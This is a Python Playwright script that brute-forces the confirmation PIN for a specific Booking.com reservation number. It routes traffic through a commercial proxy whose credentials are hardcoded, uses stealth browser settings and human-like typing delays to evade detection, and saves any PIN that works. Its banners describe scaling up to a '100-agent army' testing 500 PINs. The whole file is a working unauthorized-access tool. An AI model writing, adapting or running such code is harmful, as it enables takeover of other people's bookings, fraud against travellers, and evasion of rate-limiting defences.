#!/usr/bin/env python3
"""
🎯 MASTER AGENT 001 - PIN HUNTER
Target: 5727559423
Test PINs: 1759, 5585, 2390, 3008, 2963
Mission: Find the CORRECT PIN, then clone army
"""

from playwright.sync_api import sync_playwright
import time
import json
import os
from datetime import datetime
from colorama import Fore, Back, Style, init

# Initialize colorama
init(autoreset=True)

# MASTER AGENT CONFIGURATION
AGENT_ID = "MASTER_001"
BOOKING_ID = "5727559423"
TEST_PINS = ["1759", "5585", "2390", "3008", "2963"]  # All 5 test PINs
WAIT_TIME = 15  # Human-like wait between PINs (increased for better stealth)

# CORRECT PROXY CONFIGURATION
PROXY_CONFIG = {
    "server": "https://us-pr.oxylabs.io:10000",
    "username": "customer-oxy1p_hnzsA",
    "password": "oxy1p_hnzsA1"
}

# STEALTH BROWSER ARGUMENTS
STEALTH_ARGS = [
    "--no-sandbox",
    "--disable-dev-shm-usage",
    "--disable-gpu",
    "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]

# FILE PATHS
SCREEN_DIR = "master_screenshots"
SUCCESS_FILE = "MASTER_SUCCESS.json"
LOG_FILE = "master_agent_log.txt"

# Create directories
os.makedirs(SCREEN_DIR, exist_ok=True)

def log_result(pin, result, url, attempt_num):
    """Log each attempt"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"{timestamp},{BOOKING_ID},{AGENT_ID},{pin},{result},{url},attempt_{attempt_num}\n"
    
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(log_entry)
    
    print(f"📝 [{timestamp}] PIN {pin}: {result}")

def save_success(pin, url, attempt_num):
    """Save success details for army replication"""
    success_data = {
        "booking_id": BOOKING_ID,
        "correct_pin": pin,
        "success_url": url,
        "agent": AGENT_ID,
        "attempt_number": attempt_num,
        "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "proxy_used": PROXY_CONFIG,
        "total_pins_tested": TEST_PINS
    }
    
    with open(SUCCESS_FILE, 'w', encoding='utf-8') as f:
        json.dump(success_data, f, indent=2)

def display_victory_banner(pin, attempt_num):
    """Display victory banner"""
    banner = f"""
{Fore.GREEN}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                    🎉 MASTER AGENT SUCCESS! 🎉                              ║
║                                                                              ║
║  Target Booking: {BOOKING_ID}                                               ║
║  CORRECT PIN: {pin}                                                        ║
║  Agent: {AGENT_ID}                                                          ║
║  Attempt: {attempt_num}/5                                                   ║
║  Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}                 ║
║                                                                              ║
║              🚀 READY TO CLONE 99 AGENTS! 🚀                               ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
    print(banner)

def test_pin(pin, attempt_num):
    """Test a single PIN - returns True if successful"""
    try:
        print(f"\n{Fore.YELLOW}🔍 [{AGENT_ID}] Testing PIN {attempt_num}/5: {pin}{Style.RESET_ALL}")
        
        with sync_playwright() as p:
            browser = p.chromium.launch(
                headless=False,
                proxy=PROXY_CONFIG,
                args=STEALTH_ARGS
            )
            page = browser.new_page()
            
            try:
                # Test proxy first
                print(f"🛡️ Testing proxy connection...")
                try:
                    page.goto("https://httpbin.org/ip", timeout=15000)
                    ip_info = page.content()
                    print(f"🌐 Proxy IP check: {ip_info[:100]}...")
                except Exception as proxy_e:
                    print(f"⚠️ Proxy test failed: {proxy_e}")
                
                # Navigate to booking page
                print(f"🌐 Opening booking.com...")
                page.goto("https://secure.booking.com/help/confirmation_pin_auth", 
                         wait_until="load", timeout=30000)
                print(f"✅ Page loaded successfully")
                
                # Fill booking ID with human-like typing
                page.wait_for_selector('input[placeholder="e.g. 1234567890"]', timeout=15000)
                print(f"📝 Filling booking ID: {BOOKING_ID}")
                booking_input = page.locator('input[placeholder="e.g. 1234567890"]')
                booking_input.clear()
                booking_input.type(BOOKING_ID, delay=100)  # Human-like typing with delay
                
                time.sleep(1)  # Small pause between fields
                
                print(f"🔐 Filling PIN: {pin}")
                pin_input = page.locator('input[placeholder="e.g. 1234"]')
                pin_input.clear()
                pin_input.type(pin, delay=150)  # Slightly slower for PIN
                
                time.sleep(2)  # Pause before clicking submit
                
                # Click Continue button
                print(f"🔍 Looking for Continue button...")
                try:
                    page.wait_for_selector('button:has-text("Continue")', timeout=5000)
                    page.click('button:has-text("Continue")')
                    print(f"✅ Clicked Continue button")
                except:
                    page.wait_for_selector('button[type="submit"]', timeout=5000)
                    page.click('button[type="submit"]')
                    print(f"✅ Clicked Submit button")
                
                # Wait for result with proper timing
                print(f"⏳ Waiting for response...")
                time.sleep(3)  # Initial wait for form submission
                
                # Wait for page to process and potentially redirect
                print(f"🔄 Waiting for page processing...")
                try:
                    # Wait for either redirect or error message to appear
                    page.wait_for_load_state("networkidle", timeout=10000)
                    time.sleep(5)  # Additional wait for any slow redirects
                    
                    current_url = page.url
                    print(f"🔍 Current URL after processing: {current_url}")
                    
                    # Give more time if still processing
                    if current_url == "https://secure.booking.com/help/confirmation_pin_auth":
                        print(f"⏳ Still on auth page, waiting longer...")
                        time.sleep(8)  # Wait longer for potential redirect
                        current_url = page.url
                        print(f"🔍 Final URL check: {current_url}")
                    
                    # Check for SUCCESS patterns - must be very specific
                    success_detected = False
                    
                    # Only consider these URLs as true success
                    if ("unique_order_id" in current_url or 
                        "booking_details" in current_url or 
                        "/help/reservation" in current_url or
                        "/myreservations" in current_url or
                        "/confirmation" in current_url):
                        
                        # Double-check with page content for confirmation
                        page_content = page.content().lower()
                        success_keywords = ["reservation", "booking confirmed", "confirmation", "thank you"]
                        
                        if any(keyword in page_content for keyword in success_keywords):
                            success_detected = True
                    
                    if success_detected:
                        # TRUE SUCCESS FOUND!
                        page.screenshot(path=f"{SCREEN_DIR}/{BOOKING_ID}_{pin}_SUCCESS.png")
                        log_result(pin, 'SUCCESS', current_url, attempt_num)
                        save_success(pin, current_url, attempt_num)
                        display_victory_banner(pin, attempt_num)
                        return True
                    
                    # If we reach here, it's either an error or still on auth page
                    # Check for explicit error messages first
                    error_selectors = [
                        '.bui-alert--error', 
                        '[class*="error"]', 
                        '.alert-danger',
                        '[data-testid*="error"]',
                        '.notification--error'
                    ]
                    
                    error_found = False
                    for selector in error_selectors:
                        error_elements = page.query_selector_all(selector)
                        if len(error_elements) > 0:
                            error_text = error_elements[0].text_content() if error_elements[0].text_content() else "Error detected"
                            print(f"❌ PIN {pin} is INCORRECT (error found: {error_text[:50]}...)")
                            page.screenshot(path=f"{SCREEN_DIR}/{BOOKING_ID}_{pin}_FAIL.png")
                            log_result(pin, f'FAILURE: {error_text[:100]}', current_url, attempt_num)
                            error_found = True
                            break
                    
                    if error_found:
                        return False
                    
                    # Check page content for error keywords
                    page_content = page.content().lower()
                    error_keywords = ["incorrect", "invalid", "wrong", "error", "failed", "not found", "pin is not correct"]
                    
                    for keyword in error_keywords:
                        if keyword in page_content:
                            print(f"❌ PIN {pin} is INCORRECT (found '{keyword}' in content)")
                            page.screenshot(path=f"{SCREEN_DIR}/{BOOKING_ID}_{pin}_FAIL.png")
                            log_result(pin, f'FAILURE: Content contains {keyword}', current_url, attempt_num)
                            return False
                    
                    # If still on auth page, definitely incorrect PIN
                    if "confirmation_pin_auth" in current_url:
                        print(f"❌ PIN {pin} is INCORRECT (remained on auth page)")
                        page.screenshot(path=f"{SCREEN_DIR}/{BOOKING_ID}_{pin}_FAIL.png")
                        log_result(pin, 'FAILURE: Still on auth page', current_url, attempt_num)
                        return False
                    
                    # Unknown result
                    print(f"❓ Unknown result for PIN {pin}")
                    page.screenshot(path=f"{SCREEN_DIR}/{BOOKING_ID}_{pin}_UNKNOWN.png")
                    log_result(pin, 'UNKNOWN', current_url, attempt_num)
                    return False
                    
                except Exception as inner_e:
                    print(f"⚠️ Error checking result: {inner_e}")
                    current_url = page.url
                    page.screenshot(path=f"{SCREEN_DIR}/{BOOKING_ID}_{pin}_ERROR.png")
                    log_result(pin, 'ERROR', current_url, attempt_num)
                    return False
                
            finally:
                browser.close()
                
    except Exception as e:
        error_msg = f'EXCEPTION: {str(e)[:200]}'
        log_result(pin, error_msg, 'N/A', attempt_num)
        print(f"{Fore.RED}💥 Exception testing PIN {pin}: {str(e)[:100]}{Style.RESET_ALL}")
        return False

def main():
    """Main master agent function"""
    print(f"""
{Fore.CYAN}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                     🎯 MASTER AGENT 001 STARTING 🎯                         ║
║                                                                              ║
║  Target Booking: {BOOKING_ID}                                               ║
║  Test PINs: {', '.join(TEST_PINS)}                                          ║
║  Mission: Find CORRECT PIN                                                  ║
║  Proxy: {PROXY_CONFIG['server']}                                            ║
║  Next: Clone 99 agents for 500-PIN army                                    ║
║                                                                              ║
║                        🚀 MISSION START! 🚀                                ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
""")
    
    # Test each PIN
    for i, pin in enumerate(TEST_PINS, 1):
        print(f"\n{Fore.BLUE}🎯 Testing PIN {i}/5: {pin}{Style.RESET_ALL}")
        
        if test_pin(pin, i):
            print(f"\n{Fore.GREEN}🎉 CORRECT PIN FOUND: {pin}!{Style.RESET_ALL}")
            print(f"{Fore.GREEN}✅ Master agent mission complete!{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}🔄 Ready to create 99 agent copies...{Style.RESET_ALL}")
            break
        
        # Wait before next PIN (except last)
        if i < len(TEST_PINS):
            print(f"{Fore.BLUE}⏳ Human breathing... waiting {WAIT_TIME}s before next PIN...{Style.RESET_ALL}")
            time.sleep(WAIT_TIME)
    
    # Final report
    if os.path.exists(SUCCESS_FILE):
        with open(SUCCESS_FILE, 'r') as f:
            success_data = json.load(f)
        print(f"\n{Fore.GREEN}🎯 MISSION STATUS: SUCCESS!")
        print(f"🔑 Correct PIN: {success_data['correct_pin']}")
        print(f"📍 Found at attempt: {success_data['attempt_number']}/5")
        print(f"🚀 Ready for 100-agent army deployment!{Style.RESET_ALL}")
    else:
        print(f"\n{Fore.RED}❌ MISSION STATUS: NO SUCCESS")
        print(f"💡 None of the 5 test PINs worked")
        print(f"🔄 Need to check PIN list or booking ID{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}❌ Master agent interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}💥 Unexpected error: {str(e)}{Style.RESET_ALL}")
